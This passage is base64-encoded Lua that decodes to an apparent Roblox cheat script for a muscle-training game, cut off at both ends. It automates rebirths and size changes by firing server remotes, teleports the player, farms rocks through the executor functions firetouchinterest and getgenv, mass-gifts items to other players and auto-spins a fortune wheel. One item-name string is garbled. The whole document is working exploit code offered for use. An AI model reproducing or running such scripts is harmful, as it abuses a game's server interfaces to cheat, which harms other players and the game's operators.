rID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgaWYgc3RhdGUgdGhlbgogICAgICAgICAgICBpZiB0YXJnZXRSZWJpcnRoID4gMCB0aGVuCiAgICAgICAgICAgICAgICBhdXRvUmViaXJ0aEFjdGl2ZSA9IHRydWUKICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oYXV0b1JlYmlydGgpCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHdhcm4oIltTeXN0ZW1dIFNldCBhIHZhbGlkIHRhcmdldCBudW1iZXIgZmlyc3QhIikKICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZQogICAgICAgICAgICBhdXRvUmViaXJ0aEFjdGl2ZSA9IGZhbHNlCiAgICAgICAgZW5kCiAgICBlbmQKfSkKClJlYmlydGhUYWI6U2VjdGlvbih7VGl0bGUgPSAiTm9ybWFsIFJlYmlydGgifSkKCmxvY2FsIGF1dG9SZWJpcnRoRW5hYmxlZCA9IGZhbHNlCgpsb2NhbCBmdW5jdGlvbiBhdXRvUmViaXJ0aCgpCiAgICB3aGlsZSBhdXRvUmViaXJ0aEVuYWJsZWQgZG8KICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5yZWJpcnRoUmVtb3RlOkludm9rZVNlcnZlcigicmViaXJ0aFJlcXVlc3QiKQogICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICBlbmQKZW5kCgpSZWJpcnRoVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFJlYmlydGggKElORklOSVRFKSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGF1dG9SZWJpcnRoRW5hYmxlZCA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbiB0YXNrLnNwYXduKGF1dG9SZWJpcnRoKSBlbmQKICAgIGVuZAp9KQoKbG9jYWwgc2l6ZUNoYW5nZUVuYWJsZWQgPSBmYWxzZQoKbG9jYWwgZnVuY3Rpb24gY2hhbmdlU2l6ZSgpCiAgICB3aGlsZSBzaXplQ2hhbmdlRW5hYmxlZCBkbwogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmNoYW5nZVNwZWVkU2l6ZVJlbW90ZTpJbnZva2VTZXJ2ZXIoImNoYW5nZVNpemUiLCAyKQogICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICBlbmQKZW5kCgpSZWJpcnRoVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFNpemUgMiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIHNpemVDaGFuZ2VFbmFibGVkID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuIHRhc2suc3Bhd24oY2hhbmdlU2l6ZSkgZW5kCiAgICBlbmQKfSkKCmxvY2FsIHRlbGVwb3J0RW5hYmxlZCA9IGZhbHNlICAKCmxvY2FsIGZ1bmN0aW9uIHRlbGVwb3J0VG9NdXNjbGVLaW5nKCkgIAogICAgd2hpbGUgdGVsZXBvcnRFbmFibGVkIGRvICAKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIgIAogICAgICAgIGlmIHBsYXllciBhbmQgcGxheWVyLkNoYXJhY3RlciBhbmQgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4gIAogICAgICAgICAgICBwbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtODY2MS44NjQsIDE3LjI3OCwgLTU3MzAuNzkzKSAgCiAgICAgICAgZW5kICAKICAgICAgICB0YXNrLndhaXQoMSkKICAgIGVuZCAgCmVuZAoKUmViaXJ0aFRhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBUUCBNdXNjbGUgS2luZyBHeW0iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICB0ZWxlcG9ydEVuYWJsZWQgPSBzdGF0ZSAgCiAgICAgICAgaWYgc3RhdGUgdGhlbiB0YXNrLnNwYXduKHRlbGVwb3J0VG9NdXNjbGVLaW5nKSBlbmQgIAogICAgZW5kCn0pCgotLSBSb2NrIFRhYgpsb2NhbCBSb2NrVGFiID0gV2luZG93OlRhYih7VGl0bGUgPSAiUm9jayIsIEljb24gPSAibW91bnRhaW4ifSkKCi0tIEZhc3QgR2xpdGNoIFNlY3Rpb24KUm9ja1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJGQVNUIEdMSVRDSCJ9KQoKbG9jYWwgc2VsZWN0cm9jayA9ICIiCgotLSBSb2NrIEZhcm0gRnVuY3Rpb25zCmxvY2FsIGZ1bmN0aW9uIGNyZWF0ZVJvY2tUb2dnbGUodGl0bGUsIGRlc2MsIHJvY2tOYW1lLCBkdXJhYmlsaXR5KQogICAgUm9ja1RhYjpUb2dnbGUoewogICAgICAgIFRpdGxlID0gdGl0bGUsCiAgICAgICAgRGVzYyA9IGRlc2MsCiAgICAgICAgVmFsdWUgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICBzZWxlY3Ryb2NrID0gcm9ja05hbWUKICAgICAgICAgICAgZ2V0Z2VudigpLmF1dG9GYXJtID0gc3RhdGUKICAgICAgICAgICAgd2hpbGUgZ2V0Z2VudigpLmF1dG9GYXJtIGRvCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuRHVyYWJpbGl0eS5WYWx1ZSA+PSBkdXJhYmlsaXR5IHRoZW4KICAgICAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpLm1hY2hpbmVzRm9sZGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAibmVlZGVkRHVyYWJpbGl0eSIgYW5kIHYuVmFsdWUgPT0gZHVyYWJpbGl0eSBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKSBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLlJpZ2h0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5SaWdodEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuTGVmdEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuTGVmdEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2Lk5hbWUgPT0gIlB1bmNoIiBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKHYpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgImxlZnRIYW5kIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgInJpZ2h0SGFuZCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKZW5kCgotLSBSb2NrIEZhcm0gVG9nZ2xlcwpjcmVhdGVSb2NrVG9nZ2xlKCJBdXRvIFRpbnlJc2xhbmRSb2NrIFswXSIsICIwIER1cmFiaWxpdHkgUmVxdWlyZWQiLCAiVGlueSBJc2xhbmQgUm9jayIsIDApCmNyZWF0ZVJvY2tUb2dnbGUoIkF1dG8gU3RhcnRlcklzbGFuZFJvY2sgWzEwMF0iLCAiMTAwIER1cmFiaWxpdHkgUmVxdWlyZWQiLCAiU3RhcnRlciBJc2xhbmQgUm9jayIsIDEwMCkKY3JlYXRlUm9ja1RvZ2dsZSgiQXV0byBMZWdlbmRCZWFjaFJvY2sgWzVrXSIsICI1LDAwMCBEdXJhYmlsaXR5IFJlcXVpcmVkIiwgIkxlZ2VuZCBCZWFjaCBSb2NrIiwgNTAwMCkKY3JlYXRlUm9ja1RvZ2dsZSgiQXV0byBGcm9zdEd5bVJvY2sgWzE1MGtdIiwgIjE1MCwwMDAgRHVyYWJpbGl0eSBSZXF1aXJlZCIsICJGcm9zdCBHeW0gUm9jayIsIDE1MDAwMCkKY3JlYXRlUm9ja1RvZ2dsZSgiQXV0byBNeXRoaWNhbEd5bVJvY2sgWzQwMGtdIiwgIjQwMCwwMDAgRHVyYWJpbGl0eSBSZXF1aXJlZCIsICJNeXRoaWNhbCBHeW0gUm9jayIsIDQwMDAwMCkKY3JlYXRlUm9ja1RvZ2dsZSgiQXV0byBFdGVybmFsR3ltUm9jayBbNzUwa10iLCAiNzUwLDAwMCBEdXJhYmlsaXR5IFJlcXVpcmVkIiwgIkV0ZXJuYWwgR3ltIFJvY2siLCA3NTAwMDApCmNyZWF0ZVJvY2tUb2dnbGUoIkF1dG8gTGVnZW5kR3ltUm9jayBbMW1dIiwgIjEsMDAwLDAwMCBEdXJhYmlsaXR5IFJlcXVpcmVkIiwgIkxlZ2VuZCBHeW0gUm9jayIsIDEwMDAwMDApCmNyZWF0ZVJvY2tUb2dnbGUoIkF1dG8gTXVzY2xlS2luZ0d5bVJvY2sgWzVtXSIsICI1LDAwMCwwMDAgRHVyYWJpbGl0eSBSZXF1aXJlZCIsICJNdXNjbGUgS2luZyBHeW0gUm9jayIsIDUwMDAwMDApCmNyZWF0ZVJvY2tUb2dnbGUoIkF1dG8gQW5jaWVudEp1bmdsZVJvY2sgWzEwbV0iLCAiMTAsMDAwLDAwMCBEdXJhYmlsaXR5IFJlcXVpcmVkIiwgIkFuY2llbnQgSnVuZ2xlIFJvY2siLCAxMDAwMDAwMCkKCi0tIEVnZ3MgVGFiCmxvY2FsIEVnZ3NUYWIgPSBXaW5kb3c6VGFiKHtUaXRsZSA9ICJFZ2dzIiwgSWNvbiA9ICJnaWZ0In0pCgotLSBQcm90ZWluIEVnZyBHaWZ0aW5nIFNlY3Rpb24KRWdnc1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJHaWZ0aW5nIFByb3RlaW4gRWdnIn0pCgpsb2NhbCBwcm90ZWluRWdnTGFiZWwgPSBFZ2dzVGFiOkxhYmVsKHtUaXRsZSA9ICJQcm90ZWluIEVnZ3MiLCBEZXNjID0gIjAifSkKbG9jYWwgc2VsZWN0ZWRFZ2dQbGF5ZXIgPSBuaWwKbG9jYWwgZWdnQ291bnQgPSAwCgpsb2NhbCBlZ2dEcm9wZG93biA9IEVnZ3NUYWI6RHJvcGRvd24oewogICAgVGl0bGUgPSAiUGxheWVyIHRvIEdpZnQgRWdncyIsCiAgICBMaXN0ID0ge30sCiAgICBWYWx1ZSA9ICIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzZWxlY3RlZERpc3BsYXlOYW1lKQogICAgICAgIGZvciBfLCBwbHIgaW4gaXBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgcGxyLkRpc3BsYXlOYW1lID09IHNlbGVjdGVkRGlzcGxheU5hbWUgdGhlbgogICAgICAgICAgICAgICAgc2VsZWN0ZWRFZ2dQbGF5ZXIgPSBwbHIKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBQb3B1bGF0ZSBkcm9wZG93biB3aXRoIHBsYXllcnMKZm9yIF8sIHBsciBpbiBpcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIik6R2V0UGxheWVycygpKSBkbwogICAgaWYgcGxyIH49IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyIHRoZW4KICAgICAgICBlZ2dEcm9wZG93bjpBZGQocGxyLkRpc3BsYXlOYW1lKQogICAgZW5kCmVuZAoKZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihwbHIpCiAgICBpZiBwbHIgfj0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIGVnZ0Ryb3Bkb3duOkFkZChwbHIuRGlzcGxheU5hbWUpCiAgICBlbmQKZW5kKQoKRWdnc1RhYjpUZXh0Ym94KHsKICAgIFRpdGxlID0gIkFtb3VudCBvZiBFZ2dzIiwKICAgIERlc2MgPSAiRW50ZXIgbnVtYmVyIG9mIGVnZ3MgdG8gZ2lmdCIsCiAgICBQbGFjZWhvbGRlciA9ICIwIiwKICAgIFZhbHVlID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHRleHQpCiAgICAgICAgZWdnQ291bnQgPSB0b251bWJlcih0ZXh0KSBvciAwCiAgICBlbmQKfSkKCkVnZ3NUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIkdpZnQgRWdncyIsCiAgICBEZXNjID0gIlNlbmQgcHJvdGVpbiBlZ2dzIHRvIHNlbGVjdGVkIHBsYXllciIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBpZiBzZWxlY3RlZEVnZ1BsYXllciBhbmQgZWdnQ291bnQgPiAwIHRoZW4KICAgICAgICAgICAgZm9yIGkgPSAxLCBlZ2dDb3VudCBkbwogICAgICAgICAgICAgICAgbG9jYWwgZWdnID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuY29uc3VtYWJsZXNGb2xkZXI6RmluZEZpcnN0Q2hpbGQoIlByb3RlaW4gRWdnIikKICAgICAgICAgICAgICAgIGlmIGVnZyB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMuZ2lmdFJlbW90ZTpJbnZva2VTZXJ2ZXIoImdpZnRSZXF1ZXN0Iiwgc2VsZWN0ZWRFZ2dQbGF5ZXIsIGVnZykKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBUcm9waWNhbCBTaGFrZSBHaWZ0aW5nIFNlY3Rpb24KRWdnc1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJHaWZ0aW5nIFRyb3BpY2FsIFNoYWtlcyJ9KQoKbG9jYWwgdHJvcGljYWxTaGFrZUxhYmVsID0gRWdnc1RhYjpMYWJlbCh7VGl0bGUgPSAiVHJvcGljYWwgU2hha2VzIiwgRGVzYyA9ICIwIn0pCmxvY2FsIHNlbGVjdGVkU2hha2VQbGF5ZXIgPSBuaWwKbG9jYWwgc2hha2VDb3VudCA9IDAKCmxvY2FsIHNoYWtlRHJvcGRvd24gPSBFZ2dzVGFiOkRyb3Bkb3duKHsKICAgIFRpdGxlID0gIlBsYXllciB0byBHaWZ0IFRyb3BpY2FsIFNoYWtlcyIsCiAgICBMaXN0ID0ge30sCiAgICBWYWx1ZSA9ICIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzZWxlY3RlZERpc3BsYXlOYW1lKQogICAgICAgIGZvciBfLCBwbHIgaW4gaXBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgcGxyLkRpc3BsYXlOYW1lID09IHNlbGVjdGVkRGlzcGxheU5hbWUgdGhlbgogICAgICAgICAgICAgICAgc2VsZWN0ZWRTaGFrZVBsYXllciA9IHBscgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCmZvciBfLCBwbHIgaW4gaXBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpOkdldFBsYXllcnMoKSkgZG8KICAgIGlmIHBsciB+PSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllciB0aGVuCiAgICAgICAgc2hha2VEcm9wZG93bjpBZGQocGxyLkRpc3BsYXlOYW1lKQogICAgZW5kCmVuZAoKZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihwbHIpCiAgICBpZiBwbHIgfj0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIHNoYWtlRHJvcGRvd246QWRkKHBsci5EaXNwbGF5TmFtZSkKICAgIGVuZAplbmQpCgpFZ2dzVGFiOlRleHRib3goewogICAgVGl0bGUgPSAiVHJvcGljYWwgU2hha2VzIGdpZnQiLAogICAgRGVzYyA9ICJFbnRlciBudW1iZXIgb2Ygc2hha2VzIHRvIGdpZnQiLAogICAgUGxhY2Vob2xkZXIgPSAiMCIsCiAgICBWYWx1ZSA9ICIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQogICAgICAgIHNoYWtlQ291bnQgPSB0b251bWJlcih0ZXh0KSBvciAwCiAgICBlbmQKfSkKCkVnZ3NUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIkdpZnQgVHJvcGljYWwgU2hha2VzIiwKICAgIERlc2MgPSAiU2VuZCB0cm9waWNhbCBzaGFrZXMgdG8gc2VsZWN0ZWQgcGxheWVyIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGlmIHNlbGVjdGVkU2hha2VQbGF5ZXIgYW5kIHNoYWtlQ291bnQgPiAwIHRoZW4KICAgICAgICAgICAgZm9yIGkgPSAxLCBzaGFrZUNvdW50IGRvCiAgICAgICAgICAgICAgICBsb2NhbCBzaGFrZSA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLmNvbnN1bWFibGVzRm9sZGVyOkZpbmRGaXJzdENoaWxkKCJUcm9waWNhbCBTaGFrZSIpCiAgICAgICAgICAgICAgICBpZiBzaGFrZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMuZ2lmdFJlbW90ZTpJbnZva2VTZXJ2ZXIoImdpZnRSZXF1ZXN0Iiwgc2VsZWN0ZWRTaGFrZVBsYXllciwgc2hha2UpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gSXRlbSBDb3VudCBVcGRhdGVyCmxvY2FsIGZ1bmN0aW9uIHVwZGF0ZUl0ZW1Db3VudCgpCiAgICBsb2NhbCBwcm90ZWluRWdnQ291bnQgPSAwCiAgICBsb2NhbCB0cm9waWNhbFNoYWtlQ291bnQgPSAwCgogICAgbG9jYWwgYmFja3BhY2sgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcjpXYWl0Rm9yQ2hpbGQoIkJhY2twYWNrIikKICAgIGlmIGJhY2twYWNrIHRoZW4KICAgICAgICBmb3IgXywgaXRlbSBpbiBpcGFpcnMoYmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgaXRlbS5OYW1lID09ICJQcm90ZWluIEVnZyIgdGhlbgogICAgICAgICAgICAgICAgcHJvdGVpbkVnZ0NvdW50ID0gcHJvdGVpbkVnZ0NvdW50ICsgMQogICAgICAgICAgICBlbHNlaWYgaXRlbS5OYW1lID09ICJUcm9waWNhbCBTaGFrZSIgb3IgaXRlbS5OYW1lID09ICJQacODxpLDhuKAmcOD4oCgw6LigqzihKLDg8aSw6LigqzFocOD4oCaw4LCsWFzIiB0aGVuCiAgICAgICAgICAgICAgICB0cm9waWNhbFNoYWtlQ291bnQgPSB0cm9waWNhbFNoYWtlQ291bnQgKyAxCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgcHJvdGVpbkVnZ0xhYmVsOlNldERlc2ModG9zdHJpbmcocHJvdGVpbkVnZ0NvdW50KSkKICAgIHRyb3BpY2FsU2hha2VMYWJlbDpTZXREZXNjKHRvc3RyaW5nKHRyb3BpY2FsU2hha2VDb3VudCkpCmVuZAoKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgdXBkYXRlSXRlbUNvdW50KCkKICAgICAgICB0YXNrLndhaXQoMC4yNSkKICAgIGVuZAplbmQpCgotLSBBdXRvIEZlYXR1cmVzIFNlY3Rpb24KRWdnc1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJBdXRvIEZlYXR1cmVzIn0pCgotLSBBdXRvIEVhdCBFZ2cgKDMwbWluKQpsb2NhbCBhdXRvRWdnRW5hYmxlZDMwID0gZmFsc2UKbG9jYWwgZnVuY3Rpb24gYXV0b0VhdEVnZzMwKCkKICAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICB3aGlsZSBhdXRvRWdnRW5hYmxlZDMwIGRvCiAgICAgICAgbG9jYWwgdG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHJvdGVpbiBFZ2ciKQogICAgICAgIGlmIHRvb2wgdGhlbgogICAgICAgICAgICB0b29sLlBhcmVudCA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgdG9vbDpBY3RpdmF0ZSgpCiAgICAgICAgICAgIHRhc2sud2FpdCgxODAwKSAtLSAzMCBtaW51dGVzCiAgICAgICAgZWxzZQogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICBlbmQKICAgIGVuZAplbmQKCkVnZ3NUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gUHJvdGVpbiBFZ2cgKDMwbWluKSIsCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgZWF0IHByb3RlaW4gZWdncyBldmVyeSAzMCBtaW51dGVzIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGF1dG9FZ2dFbmFibGVkMzAgPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIHRoZW4gdGFzay5zcGF3bihhdXRvRWF0RWdnMzApIGVuZAogICAgZW5kCn0pCgotLSBBdXRvIEVhdCBFZ2cgKDFob3VyKQpsb2NhbCBhdXRvRWdnRW5hYmxlZDYwID0gZmFsc2UKbG9jYWwgZnVuY3Rpb24gYXV0b0VhdEVnZzYwKCkKICAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICB3aGlsZSBhdXRvRWdnRW5hYmxlZDYwIGRvCiAgICAgICAgbG9jYWwgdG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHJvdGVpbiBFZ2ciKQogICAgICAgIGlmIHRvb2wgdGhlbgogICAgICAgICAgICB0b29sLlBhcmVudCA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgdG9vbDpBY3RpdmF0ZSgpCiAgICAgICAgICAgIHRhc2sud2FpdCgzNjAwKSAtLSAxIGhvdXIKICAgICAgICBlbHNlCiAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgIGVuZAogICAgZW5kCmVuZAoKRWdnc1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBQcm90ZWluIEVnZyAoMWhvdXIpIiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBlYXQgcHJvdGVpbiBlZ2dzIGV2ZXJ5IGhvdXIiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgYXV0b0VnZ0VuYWJsZWQ2MCA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbiB0YXNrLnNwYXduKGF1dG9FYXRFZ2c2MCkgZW5kCiAgICBlbmQKfSkKCi0tIEF1dG8gRWF0IEFsbCBTbmFja3MKbG9jYWwgZWF0U25hY2tFbmFibGVkID0gZmFsc2UKbG9jYWwgc25hY2tzID0geyJUcm9waWNhbCBTaGFrZSJ9IC0tIEFkZCBvdGhlciBzbmFjayBuYW1lcyBhcyBuZWVkZWQKCmxvY2FsIGZ1bmN0aW9uIGVhdEFsbFNuYWNrKCkKICAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICB3aGlsZSBlYXRTbmFja0VuYWJsZWQgZG8KICAgICAgICBmb3IgXywgc25hY2tOYW1lIGluIGlwYWlycyhzbmFja3MpIGRvCiAgICAgICAgICAgIGxvY2FsIHRvb2wgPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoc25hY2tOYW1lKQogICAgICAgICAgICBpZiB0b29sIHRoZW4KICAgICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgIHRvb2w6QWN0aXZhdGUoKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICB0YXNrLndhaXQobWF0aC5yYW5kb20oMSwgMikpCiAgICBlbmQKZW5kCgpFZ2dzVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIEVhdCBBbGwgU25hY2tzIiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBjb25zdW1lIGFsbCBhdmFpbGFibGUgc25hY2tzIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGVhdFNuYWNrRW5hYmxlZCA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbiB0YXNrLnNwYXduKGVhdEFsbFNuYWNrKSBlbmQKICAgIGVuZAp9KQoKLS0gQXV0byBTcGluIFdoZWVsCmxvY2FsIGF1dG9TcGluV2hlZWxFbmFibGVkID0gZmFsc2UKCmxvY2FsIGZ1bmN0aW9uIGF1dG9TcGluV2hlZWwoKQogICAgd2hpbGUgYXV0b1NwaW5XaGVlbEVuYWJsZWQgZG8KICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5vcGVuRm9ydHVuZVdoZWVsUmVtb3RlOkludm9rZVNlcnZlcigib3BlbkZvcnR1bmVXaGVlbCIsIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5mb3J0dW5lV2hlZWxDaGFuY2VzWyJGb